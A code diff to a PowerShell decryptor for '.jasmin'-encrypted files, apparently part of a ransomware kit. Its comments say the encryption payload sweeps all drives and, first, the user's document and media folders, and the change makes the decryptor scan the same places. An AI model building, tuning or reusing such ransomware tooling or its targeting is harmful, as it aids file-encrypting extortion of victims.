@@ -9,7 +9,8 @@
 # 说明:
 #   - 私钥以 AES-128-CBC 加密传输（与 PHP/Python 两端 keygen 统一）
 #   - 仅需 .NET 内置密码学库，不依赖 openssl / python / exe
-#   - 不指定 -Paths 时默认解密当前目录
+#   - 不指定 -Paths 时默认解密【全部】加密文件：
+#     扫描所有固定磁盘 + 常用用户目录下的每一个 .jasmin
 # ════════════════════════════════════════════════════════════════
 #Requires -Version 7.0
 
@@ -28,8 +29,24 @@ if ($K.Length -ne 32) {
 }
 
 if (-not $Paths -or $Paths.Count -eq 0) {
-    $Paths = @((Get-Location).Path)
-    Write-Host "[*] 未指定目录，使用当前目录: $($Paths[0])"
+    # 未指定 => 解密全部加密文件（与载荷一致：载荷遍历所有磁盘）
+    $Paths = @()
+    # 所有固定磁盘
+    foreach ($d in [System.IO.DriveInfo]::GetDrives()) {
+        if ($d.IsReady -and ($d.DriveType -eq 'Fixed' -or $d.DriveType -eq 'Removable')) {
+            $Paths += $d.RootDirectory.FullName
+        }
+    }
+    # 常用用户目录（载荷优先命中这里）
+    $Paths += @(
+        "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures",
+        "$env:USERPROFILE\Videos", "$env:USERPROFILE\Music",
+        "$env:USERPROFILE\OneDrive", "$env:PUBLIC"
+    )
+    $Paths = $Paths | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -Unique
+    Write-Host "[*] 未指定 -Paths — 将解密全部加密文件，扫描范围:"
+    foreach ($x in $Paths) { Write-Host "      $x" }
 }
 
 $td = Join-Path $env:TEMP ("jasmin_" + [guid]::NewGuid().ToString('N').Substring(0,8))
@@ -109,7 +126,7 @@ try {
     Write-Host ""
     Write-Host "=== 完成: $ok 个已解密, $fail 个失败 ==="
     if ($ok -eq 0 -and $fail -eq 0) {
-        Write-Host "    未找到 .jasmin 文件（检查 -Paths 是否指向正确的目录）" -ForegroundColor Yellow
+        Write-Host "    未找到 .jasmin 文件。若文件在非常规位置，请用 -Paths 显式指定目录。" -ForegroundColor Yellow
     }
     exit ([int]($fail -gt 0))
 }
